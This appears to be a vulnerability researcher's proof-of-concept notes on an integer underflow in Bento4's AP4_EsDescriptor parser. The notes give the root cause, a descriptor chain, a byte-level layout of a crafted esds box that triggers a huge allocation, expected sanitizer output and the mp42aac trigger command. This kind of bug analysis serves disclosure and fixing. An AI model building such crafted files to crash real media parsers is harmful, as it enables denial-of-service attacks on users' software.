# PoC Notes: AP4_EsDescriptor Integer Underflow → OOB Read / Huge Allocation

## Vulnerability

**File**: `Bento4/Source/C++/Core/Ap4EsDescriptor.cpp`, line 103  
**Function**: `AP4_EsDescriptor::AP4_EsDescriptor(AP4_ByteStream&, AP4_Size header_size, AP4_Size payload_size)`

```cpp
AP4_Position offset;
stream.Tell(offset);
AP4_SubStream* substream = new AP4_SubStream(stream, offset,
                                             payload_size-AP4_Size(offset-start));  // line 103
```

## Root Cause

Before line 103, the constructor reads:
- `stream.ReadUI16(m_EsId)` — 2 bytes
- `stream.ReadUI08(bits)` — 1 byte (flags)

So `offset - start = 3` bytes consumed.

When `payload_size = 2` (declared in the descriptor header), the unsigned subtraction wraps:
```
payload_size - AP4_Size(offset - start) = 2 - 3 = 0xFFFFFFFF  (AP4_Size = uint32)
```

`AP4_SubStream` receives this as `AP4_LargeSize` (uint64), stored as `m_Size = 0xFFFFFFFF` (~4 GB).

## Exploitation Chain

```
MP4 file
  └─ moov/trak/mdia/minf/stbl/stsd/mp4a
       └─ esds atom
            └─ ES_Descriptor (tag=0x03, payload_size=0x02)  ← underflow here
                 └─ SubStream1 (size=0xFFFFFFFF)
                      └─ DecoderConfigDescriptor (tag=0x04, payload_size=0x0FFFFFFF)
                           └─ SubStream2 (size=0x0FFFFFEF)
                                └─ DecoderSpecificInfo (tag=0x05, payload_size=0x0FFFFFFF)
                                     └─ m_Info.SetDataSize(0x0FFFFFFF)
                                          └─ new AP4_Byte[0x0FFFFFFF]  (~256 MB allocation)
```

## Crafted esds Box Layout

```
Offset  Content
  0-7   esds box header (size + 'esds')
  8-11  version=0, flags=0
 12     0x03 (ES_Descriptor tag)
 13     0x02 (payload_size = 2 — CRAFTED: too small)
 14-15  0x00 0x01 (ES_ID = 1 — fills declared 2-byte payload)
 16     0x00 (flags byte — read OUTSIDE declared payload by ReadUI08)
 17     0x04 (DecoderConfigDescriptor tag)   ← SubStream1 begins
 18-21  0xFF 0xFF 0xFF 0x7F (expandable size = 0x0FFFFFFF)
 22     0x40 (ObjectTypeIndication)
 23     0x15 (streamType bits)
 24-26  0x00 0x00 0x00 (BufferSize)
 27-30  0x00 0x00 0x00 0x00 (MaxBitrate)
 31-34  0x00 0x00 0x00 0x00 (AvgBitrate)    ← SubStream2 begins at offset 35 in esds
 35     0x05 (DecoderSpecificInfo tag)       ← SubStream2[0]
 36-39  0xFF 0xFF 0xFF 0x7F (expandable size = 0x0FFFFFFF)
```

## Expected ASAN/UBSAN Output

With `-fsanitize=address,undefined`:
- **OOM / bad_alloc**: `new AP4_Byte[0x0FFFFFFF]` may exceed available memory or ASAN's `mmap_limit_mb`
- **ASAN mmap limit**: ASAN internal check `(total_mmaped >> 20) < common_flags()->mmap_limit_mb` may abort
- **Crash**: `std::terminate` from unhandled `std::bad_alloc`

If the allocation succeeds on the test system:
- The SubStream reads ~0 bytes (EOF) into the 256 MB buffer (no OOB in memory)
- UBSAN does NOT catch unsigned integer wrap-around by default
- Status: UNVERIFIED (bug demonstrated at descriptor parsing layer but no memory-safety abort)

## MP4 Trigger Path

```
mp42aac input.mp4 /dev/null
  → AP4_File → AP4_AtomFactory
  → moov → trak → mdia → minf → stbl → stsd → mp4a
  → AP4_EsdsAtom → AP4_DescriptorFactory::CreateDescriptorFromStream
  → AP4_EsDescriptor (line 103 underflow)
```
